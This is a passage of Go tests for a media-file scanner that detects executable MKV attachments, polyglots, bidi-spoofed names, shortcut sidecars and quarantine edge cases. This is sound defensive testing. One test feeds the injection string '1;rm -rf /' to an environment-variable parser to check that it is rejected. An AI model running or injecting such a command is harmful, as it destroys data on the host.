		t.Errorf("nlink info %q", fr.Info["nlink"])
	}
}

func TestContextCancelStopsWalk(t *testing.T) {
	noTools(t)
	dir := t.TempDir()
	for _, n := range []string{"a.nfo", "b.nfo", "c.nfo"} {
		write(t, filepath.Join(dir, n), "nfo\n", 0o644)
	}
	ctx, cancel := context.WithCancel(context.Background())
	s := newScanner(t, mustProfile(t, "homelab"), nil)
	s.Progress = func(Result) { cancel() }
	res, err := s.ScanPath(ctx, dir)
	if err == nil {
		t.Fatal("cancelled walk returned no error")
	}
	if len(res) != 1 {
		t.Fatalf("%d results after cancel, want 1", len(res))
	}
}

// corpusExpect is one row of the corpus table: the verdict and the codes
// that must be present. Absence of other codes is never asserted.
type corpusExpect struct {
	verdict report.Severity
	codes   []string
	// anyOf, when set, requires at least one of these codes.
	anyOf []string
	// nfo marks files whose exact verdict is asserted in the nfo subtest
	// only; the main pass asserts they are never FAIL or BLOCK.
	nfo bool
}

// A conforming file under a directory whose name holds non-ASCII, bidi and
// zero-width characters scans PASS: the tools run under a UTF-8 locale, so
// mkvmerge and ffprobe see the whole path. Only the file's own name is
// subject to the BIDI_NAME check.
func TestNonASCIIDirectoryScansClean(t *testing.T) {
	r := testutil.Need(t, exec.FFmpeg, exec.FFprobe, exec.MKVMerge, exec.MKVExtract)
	s := newScanner(t, mustProfile(t, "homelab"), r)
	src := testutil.Copy(t, "conforming.mkv")
	for _, dirName := range []string{"Épisode 1 – 日本語", "sub\u202e/\u200bdeep", "émoji 🎬"} {
		root := t.TempDir()
		dir := filepath.Join(root, filepath.FromSlash(dirName))
		if err := os.MkdirAll(dir, 0o755); err != nil {
			t.Fatal(err)
		}
		dst := filepath.Join(dir, "conforming ünicode.mkv")
		b, err := os.ReadFile(src)
		if err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(dst, b, 0o644); err != nil {
			t.Fatal(err)
		}
		res, err := s.ScanPath(context.Background(), root)
		if err != nil {
			t.Fatal(err)
		}
		if len(res) != 1 || res[0].File.Path != dst {
			t.Fatalf("%q: results %+v", dirName, res)
		}
		expect(t, res[0].File, report.Pass)
		if res[0].Info == nil {
			t.Fatalf("%q: no probe result: %v", dirName, codes(res[0].File))
		}
	}
}

// A container without video or audio has nothing for ffmpeg to decode, so
// the decode pass is skipped instead of failing a healthy subtitle file.
// The choice follows the probed streams: an audio file is still decoded
// whatever its extension says.
func TestSubtitleOnlySkipsDecode(t *testing.T) {
	r := testutil.Need(t, exec.FFmpeg, exec.FFprobe, exec.MKVMerge, exec.MKVExtract)
	var mu sync.Mutex
	var lines []string
	r.Trace = func(s string) {
		mu.Lock()
		defer mu.Unlock()
		lines = append(lines, s)
	}
	decoded := func(path string) bool {
		mu.Lock()
		defer mu.Unlock()
		for _, l := range lines {
			if strings.Contains(l, "ffmpeg") && strings.Contains(l, "-f null") && strings.Contains(l, path) {
				return true
			}
		}
		return false
	}
	for _, tier := range []string{"quick", "full"} {
		s := newScanner(t, mustProfile(t, "homelab"), r)
		s.VerifyTier = tier
		subs := testutil.Copy(t, "subs.mks")
		fr := scanOne(t, s, subs)
		expect(t, fr, report.Pass)
		if fr.Has(CodeDecodeFail) {
			t.Errorf("tier %s: subs.mks failed the decode pass: %v", tier, codes(fr))
		}
		if decoded(subs) {
			t.Errorf("tier %s: ffmpeg decode ran on a subtitle-only container", tier)
		}
		audio := filepath.Join(t.TempDir(), "audio.mks")
		if err := os.Rename(testutil.Copy(t, "audio.mka"), audio); err != nil {
			t.Fatal(err)
		}
		fr = scanOne(t, s, audio)
		if fr.Has(CodeDecodeFail) {
			t.Errorf("tier %s: audio.mks: %v", tier, codes(fr))
		}
		if !decoded(audio) {
			t.Errorf("tier %s: ffmpeg decode did not run on an audio file named .mks", tier)
		}
	}
}

// An executable attachment that lies outside the last 1 MiB is not seen by
// the byte-level polyglot check; the attachment sniff must still catch it
// and BLOCK the file with ATTACH_EXEC. The file is built here: a few MiB of
// lossless video and audio muxed by mkvmerge with the ELF payload attached,
// which mkvmerge writes before the clusters.
func TestExeAttachmentOutsideTailIsBlocked(t *testing.T) {
	r := testutil.Need(t, exec.FFmpeg, exec.FFprobe, exec.MKVMerge, exec.MKVExtract)
	dir := t.TempDir()
	video := filepath.Join(dir, "big.mkv")
	res, err := r.RunWithTimeout(context.Background(), 2*time.Minute, exec.FFmpeg,
		"-v", "error", "-f", "lavfi", "-i", "testsrc2=size=640x480:rate=25",
		"-f", "lavfi", "-i", "sine=frequency=440:sample_rate=48000",
		"-t", "6", "-c:v", "libx264", "-preset", "ultrafast", "-qp", "0", "-c:a", "aac", "-shortest", video)
	if err != nil || res.ExitCode != 0 {
		skipOrFail(t, "cannot build the padded video with ffmpeg: %v %s", err, res.Stderr)
	}
	payload := write(t, filepath.Join(dir, "payload.bin"), "\x7fELF\x02\x01\x01\x00payload", 0o644)
	out := filepath.Join(dir, "big_exe.mkv")
	res, err = r.RunWithTimeout(context.Background(), 2*time.Minute, exec.MKVMerge, "-q", "-o", out, "--attach-file", payload, video)
	if err != nil || res.ExitCode >= 2 {
		t.Fatalf("mkvmerge: %v %s", err, res.Stderr)
	}
	b, err := os.ReadFile(out)
	if err != nil {
		t.Fatal(err)
	}
	at := bytes.Index(b, []byte("\x7fELF"))
	if at < 0 {
		t.Fatal("ELF payload not found in the muxed file")
	}
	if len(b) < 2<<20 || at >= len(b)-(1<<20) {
		t.Fatalf("premise not met: file is %d bytes and the payload sits at %d, inside the last 1 MiB", len(b), at)
	}
	s := newScanner(t, mustProfile(t, "homelab"), r)
	fr := scanOne(t, s, out)
	expect(t, fr, report.Block, CodeAttachExec)
	if fr.Has(CodePolyglot) {
		t.Errorf("POLYGLOT reported for a payload outside the last 1 MiB: %v", codes(fr))
	}
}

func TestCorpusVerdicts(t *testing.T) {
	r := testutil.Need(t, exec.FFmpeg, exec.FFprobe, exec.MKVMerge, exec.MKVExtract)
	root := testutil.Fixtures(t)
	s := newScanner(t, mustProfile(t, "homelab"), r)

	table := map[string]corpusExpect{
		"clean.mkv":             {verdict: report.Pass, codes: []string{CodeProvenanceInfo}},
		"nested/deep/clean.mkv": {verdict: report.Pass, codes: []string{CodeProvenanceInfo}},
		"conforming.mkv":        {verdict: report.Pass},
		"multi.mkv":             {verdict: report.Warn, codes: []string{CodeLinkInTag, CodeLinkInSubs}},
		// exe_attach.mkv is small, so its ELF attachment sits inside the
		// last 1 MiB and the byte-level polyglot check fires first and
		// returns before the attachment sniff; a larger file reports
		// ATTACH_EXEC instead (TestExeAttachmentOutsideTailIsBlocked).
		// Either code is a BLOCK for the same reason, and which one
		// appears depends only on the fixture's size.
		"exe_attach.mkv":   {verdict: report.Block, anyOf: []string{CodeAttachExec, CodePolyglot}},
		"fake_font.mkv":    {verdict: report.Block, codes: []string{CodeAttachExec}},
		"purchased.mp4":    {verdict: report.Warn, codes: []string{CodePurchaseAtom, CodeLinkInTag}},
		"truncated.mp4":    {verdict: report.Fail, anyOf: []string{CodeTruncated, CodeUnparseable}},
		"polyglot.mkv":     {verdict: report.Block, codes: []string{CodePolyglot}},
		"mislabeled.mp4":   {verdict: report.Fail, codes: []string{CodeExtMismatch}},
		"text.mkv":         {verdict: report.Fail, anyOf: []string{CodeExtMismatch, CodeUnparseable}},
		"empty.mkv":        {verdict: report.Block, codes: []string{CodeEmpty}},
		"sample.nfo":       {verdict: report.Pass, codes: []string{CodeSidecarOK}},
		"sample.url":       {verdict: report.Block, codes: []string{CodeSidecarBlocked}},
		"run.sh":           {verdict: report.Block, codes: []string{CodeSidecarBlocked}},
		"exec_perm.mkv":    {verdict: report.Warn, codes: []string{CodeExecPerm}},
		"movie‮vkm.mkv":    {verdict: report.Block, codes: []string{CodeBidiName}},
		"hard_a.mkv":       {verdict: report.Pass, codes: []string{CodeHardlinked}},
		"hard_b.mkv":       {verdict: report.Pass, codes: []string{CodeHardlinked}},
		"link.mkv":         {verdict: report.Warn, codes: []string{CodeSymlink}},
		"double.mkv.exe":   {verdict: report.Block, codes: []string{CodeSidecarBlocked}},
		"audio.mka":        {verdict: report.Pass},
		"subs.mks":         {verdict: report.Pass},
		"sample.mp3":       {verdict: report.Pass},
		"sample.mov":       {verdict: report.Pass},
		"sample.m4v":       {verdict: report.Pass},
		"sample.avi":       {verdict: report.Pass},
		"sample.ts":        {verdict: report.Pass},
		"sample.webm":      {verdict: report.Pass},
		"sample.mpg":       {verdict: report.Pass},
		"links.txt":        {verdict: report.Pass, codes: []string{CodeSidecarOK}},
		"kodi/movie.nfo":   {nfo: true},
		"kodi/tvshow.nfo":  {nfo: true},
		"kodi/episode.nfo": {nfo: true},
		"kodi/url.nfo":     {nfo: true},
		"kodi/mixed.nfo":   {nfo: true},
		"kodi/badplot.nfo": {nfo: true},
		"kodi/broken.nfo":  {nfo: true},
		"scene/plain.nfo":  {nfo: true},
		"scene/links.nfo":  {nfo: true},
		"scene/imdb.nfo":   {nfo: true},
	}

	// The table is exhaustive: every file in the corpus has a row and every
	// row names a file.
	onDisk := map[string]bool{}
	err := filepath.WalkDir(root, func(p string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if d.IsDir() || d.Name() == ".DS_Store" || strings.HasPrefix(d.Name(), ".amuxify-") {
			return nil
		}
		rel, _ := filepath.Rel(root, p)
		onDisk[filepath.ToSlash(rel)] = true
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	for rel := range onDisk {
		if _, ok := table[rel]; !ok {
			t.Errorf("fixture %q has no row in the corpus table", rel)
		}
	}
	for rel := range table {
		if !onDisk[rel] {
			t.Errorf("table row %q is not in the generated corpus", rel)
		}
	}

	results, err := s.ScanPath(context.Background(), root)
	if err != nil {
		t.Fatal(err)
	}
	got := map[string]report.FileResult{}
	for _, r := range results {
		rel, _ := filepath.Rel(root, r.File.Path)
		got[filepath.ToSlash(rel)] = r.File
	}
	if len(got) != len(onDisk) {
		t.Errorf("scanned %d files, corpus holds %d", len(got), len(onDisk))
	}

	rows := make([]string, 0, len(table))
	for rel := range table {
		rows = append(rows, rel)
	}
	sort.Strings(rows)
	for _, rel := range rows {
		want := table[rel]
		fr, ok := got[rel]
		t.Run(rel, func(t *testing.T) {
			if !ok {
				t.Fatalf("no result")
			}
			if want.nfo {
				if fr.Verdict >= report.Fail {
					t.Fatalf("verdict %s %v", fr.Verdict, codes(fr))
				}
				return
			}
			var problems []string
			if fr.Verdict != want.verdict {
				problems = append(problems, "verdict "+fr.Verdict.String()+" want "+want.verdict.String())
			}
			for _, c := range want.codes {
				if !fr.Has(c) {
					problems = append(problems, "missing "+c)
				}
			}
			if len(want.anyOf) > 0 {
				any := false
				for _, c := range want.anyOf {
					any = any || fr.Has(c)
				}
				if !any {
					problems = append(problems, "none of "+strings.Join(want.anyOf, "|"))
				}
			}
			if len(problems) == 0 {
				return
			}
			t.Fatalf("%s (%v)", strings.Join(problems, "; "), codes(fr))
		})
	}

	// Section 5.4: NFO classification, which arrives with WP4.
	t.Run("nfo", func(t *testing.T) {
		sample := got["sample.nfo"]
		hasNFO := false
		for _, f := range sample.Findings {
			if strings.HasPrefix(f.Code, "NFO_") {
				hasNFO = true
			}
		}
		if !hasNFO {
			t.Skip("NFO classification arrives with WP4")
		}
		nfo := map[string]corpusExpect{
			"sample.nfo":       {verdict: report.Pass, codes: []string{"NFO_TEXT"}},
			"kodi/movie.nfo":   {verdict: report.Pass, codes: []string{"NFO_KODI"}},
			"kodi/tvshow.nfo":  {verdict: report.Pass, codes: []string{"NFO_KODI"}},
			"kodi/episode.nfo": {verdict: report.Pass, codes: []string{"NFO_KODI"}},
			"kodi/url.nfo":     {verdict: report.Pass, codes: []string{"NFO_KODI"}},
			"kodi/mixed.nfo":   {verdict: report.Pass, codes: []string{"NFO_KODI"}},
			"kodi/badplot.nfo": {verdict: report.Warn, codes: []string{"NFO_KODI", "LINK_IN_SIDECAR"}},
			"kodi/broken.nfo":  {verdict: report.Pass, codes: []string{"NFO_TEXT"}},
			"scene/plain.nfo":  {verdict: report.Pass, codes: []string{"NFO_TEXT"}},
			"scene/links.nfo":  {verdict: report.Warn, codes: []string{"NFO_TEXT", "LINK_IN_SIDECAR"}},
			"scene/imdb.nfo":   {verdict: report.Pass, codes: []string{"NFO_KODI"}},
			"links.txt":        {verdict: report.Pass, codes: []string{CodeSidecarOK}},
		}
		for rel, want := range nfo {
			fr, ok := got[rel]
			if !ok {
				t.Errorf("%s: no result", rel)
				continue
			}
			if fr.Verdict != want.verdict {
				t.Errorf("%s: verdict %s want %s (%v)", rel, fr.Verdict, want.verdict, codes(fr))
			}
			for _, c := range want.codes {
				if !fr.Has(c) {
					t.Errorf("%s: missing %s (%v)", rel, c, codes(fr))
				}
			}
		}
		if lt := got["links.txt"]; lt.Has("LINK_IN_SIDECAR") {
			t.Errorf("links.txt: LINK_IN_SIDECAR is NFO-only in 0.3")
		}
	})

	// The fixture directory itself is untouched by a scan without
	// quarantine: every file is still there afterwards.
	for rel := range onDisk {
		if _, err := os.Lstat(filepath.Join(root, filepath.FromSlash(rel))); err != nil {
			t.Errorf("scan removed %s", rel)
		}
	}
}

// A caller that hands the file itself as the scan root, or a root the file
// does not sit under, still gets the file placed under the quarantine
// directory by its base name. The destination is never the quarantine root
// itself, so the move can never be refused as "outside" or clobber the
// directory (review C1).
func TestQuarantineWithFileAsRootUsesBaseName(t *testing.T) {
	noTools(t)
	q := filepath.Join(t.TempDir(), "quarantine")
	s := newScanner(t, mustProfile(t, "homelab"), nil)
	s.Quarantine = q
	for _, root := range []string{"file", "unrelated", "empty", "dot"} {
		t.Run(root, func(t *testing.T) {
			src := write(t, filepath.Join(t.TempDir(), "x.url"), "[InternetShortcut]\nURL=http://x\n", 0o644)
			var r string
			switch root {
			case "file":
				r = src
			case "unrelated":
				r = t.TempDir()
			case "empty":
				r = ""
			case "dot":
				r = "."
			}
			res := s.ScanFile(context.Background(), src, r)
			fr := res.File
			expect(t, fr, report.Block, CodeSidecarBlocked)
			dest := filepath.Join(q, "x.url")
			requireQuarantineFinding(t, fr, report.Block, "moved to "+dest)
			if b, err := os.ReadFile(dest); err != nil || !strings.Contains(string(b), "InternetShortcut") {
				t.Fatalf("quarantined copy at %s: %v", dest, err)
			}
			if _, err := os.Lstat(src); err == nil {
				t.Fatal("source still present after quarantine")
			}
			if fi, err := os.Lstat(q); err != nil || !fi.IsDir() {
				t.Fatalf("quarantine root is not a directory: %v", err)
			}
			if err := os.Remove(dest); err != nil {
				t.Fatal(err)
			}
		})
	}
}

// lockDir removes every permission bit from dir for the test and restores
// them at cleanup so the temp tree can be deleted. Root ignores mode bits,
// so the caller skips under uid 0.
func lockDir(t *testing.T, dir string) {
	t.Helper()
	if os.Geteuid() == 0 {
		t.Skip("root ignores directory permissions")
	}
	if err := os.Chmod(dir, 0); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chmod(dir, 0o755) })
}

// An unreadable directory never disappears from a run. The readable files
// are still reported and the walk returns an error naming the directory,
// which the callers record at run level, so a tree whose only media sits
// in a mode-000 corner is never PASS with zero files (review C2).
func TestWalkReportsUnreadableDirectory(t *testing.T) {
	noTools(t)
	root := t.TempDir()
	ok := write(t, filepath.Join(root, "a", "ok.nfo"), "nfo\n", 0o644)
	locked := filepath.Join(root, "locked")
	write(t, filepath.Join(locked, "payload.url"), "[InternetShortcut]\nURL=http://x\n", 0o644)
	lockDir(t, locked)

	paths, err := Walk(root)
	if err == nil || !strings.Contains(err.Error(), "cannot read "+locked) {
		t.Fatalf("Walk error %v, want one naming %s", err, locked)
	}
	if len(paths) != 1 || paths[0] != ok {
		t.Fatalf("paths %v, want only %s", paths, ok)
	}

	s := newScanner(t, mustProfile(t, "homelab"), nil)
	res, err := s.ScanPath(context.Background(), root)
	if err == nil || !strings.Contains(err.Error(), locked) {
		t.Fatalf("ScanPath error %v", err)
	}
	if len(res) != 1 || res[0].File.Path != ok {
		t.Fatalf("results %d", len(res))
	}
	expect(t, res[0].File, report.Pass, CodeSidecarOK)

	// The root itself unreadable: nothing is listed and the error says so.
	lockedRoot := filepath.Join(t.TempDir(), "root")
	write(t, filepath.Join(lockedRoot, "payload.url"), "x", 0o644)
	lockDir(t, lockedRoot)
	res, err = s.ScanPath(context.Background(), lockedRoot)
	if err == nil || len(res) != 0 {
		t.Fatalf("unreadable root: %d results, err %v", len(res), err)
	}
}

// Quarantine works when the quarantine directory sits on another
// filesystem: the file is copied, verified and removed from the tree, and a
// file already at the destination is still never replaced (review C3).
func TestQuarantineAcrossFilesystems(t *testing.T) {
	noTools(t)
	orig := fsutil.Place
	fsutil.Place = func(src, dest string) error {
		return &os.LinkError{Op: "rename", Old: src, New: dest, Err: syscall.EXDEV}
	}
	t.Cleanup(func() { fsutil.Place = orig })
	root := t.TempDir()
	q := filepath.Join(t.TempDir(), "quarantine")
	src := write(t, filepath.Join(root, "sub", "x.url"), "[InternetShortcut]\nURL=http://x\n", 0o644)
	s := newScanner(t, mustProfile(t, "homelab"), nil)
	s.Quarantine = q
	res, err := s.ScanPath(context.Background(), root)
	if err != nil {
		t.Fatal(err)
	}
	dest := filepath.Join(q, "sub", "x.url")
	requireQuarantineFinding(t, res[0].File, report.Block, "moved to "+dest)
	if b, err := os.ReadFile(dest); err != nil || !strings.Contains(string(b), "http://x") {
		t.Fatalf("copy at %s: %v", dest, err)
	}
	if _, err := os.Lstat(src); err == nil {
		t.Fatal("source still in the tree")
	}
	// The copy path creates the file itself with mode 0600; a rename would
	// have kept the source's 0644, so this proves the cross-device path ran.
	if fi, err := os.Lstat(dest); err != nil || fi.Mode().Perm() != 0o600 {
		t.Fatalf("quarantined copy mode %v, want 0600 from the cross-device copy", fi.Mode().Perm())
	}
	// Second file with the same mirrored name: refused, both intact.
	write(t, src, "[InternetShortcut]\nURL=http://second\n", 0o644)
	res, err = s.ScanPath(context.Background(), root)
	if err != nil {
		t.Fatal(err)
	}
	requireQuarantineFinding(t, res[0].File, report.Warn, "quarantine failed")
	if b, _ := os.ReadFile(dest); !strings.Contains(string(b), "http://x") {
		t.Fatalf("first quarantined file overwritten: %q", b)
	}
	if _, err := os.Lstat(src); err != nil {
		t.Fatal("source removed although the quarantine slot was taken")
	}
}

// Review C18: the skip helper honours AMUXIFY_REQUIRE_TOOLS the way
// testutil does, including the hostile spellings that must not count.
func TestSkipOrFailHonoursRequireTools(t *testing.T) {
	for v, want := range map[string]bool{"1": true, "true": true, "YES": true, " yes ": true,
		"": false, "0": false, "no": false, "false": false, "11": false, "1;rm -rf /": false, "true false": false} {
		t.Setenv("AMUXIFY_REQUIRE_TOOLS", v)
		if got := toolsRequired(); got != want {
			t.Errorf("AMUXIFY_REQUIRE_TOOLS=%q: required %v, want %v", v, got, want)
		}
	}
	// With the variable unset skipOrFail skips rather than fails: the test
	// process reaches the skip and its result is SKIP, not FAIL.
	t.Setenv("AMUXIFY_REQUIRE_TOOLS", "")
	skipped := t.Run("skips when unset", func(t *testing.T) {
		skipOrFail(t, "tool missing")
		t.Fatal("skipOrFail returned")
	})
	if !skipped {
		t.Error("skipOrFail failed the subtest with AMUXIFY_REQUIRE_TOOLS unset")
	}
	// With it set, skipOrFail calls t.Fatalf, which cannot be observed
	// without failing this test; the predicate it branches on is asserted
	// above.
}
